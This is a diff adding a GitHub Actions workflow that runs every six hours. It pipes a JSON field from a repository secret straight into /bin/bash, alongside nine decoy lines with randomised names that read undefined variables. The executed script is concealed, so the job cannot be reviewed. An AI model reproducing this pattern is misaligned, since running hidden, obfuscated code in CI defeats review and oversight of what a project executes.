@@ -1,0 +1,27 @@
+name: uplooksign
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: uplooksign
+        env:
+          kd40: ${{ secrets.kd40 }}
+        run: |
+          echo $kd40 | jq -r .x653 | /bin/bash
+          echo $o4764 | jq -r .kqml0056 | /bin/bash
+          echo $w014 | jq -r .ttnm16296 | /bin/bash
+          echo $caq7137 | jq -r .u9318 | /bin/bash
+          echo $xwbxv48 | jq -r .vt380 | /bin/bash
+          echo $jxpq8720 | jq -r .jbrhj1318 | /bin/bash
+          echo $ow3568 | jq -r .hb8 | /bin/bash
+          echo $o48404 | jq -r .p1396 | /bin/bash
+          echo $kkzv9806 | jq -r .f12 | /bin/bash
+          echo $gol34318 | jq -r .jgzj038 | /bin/bash
+
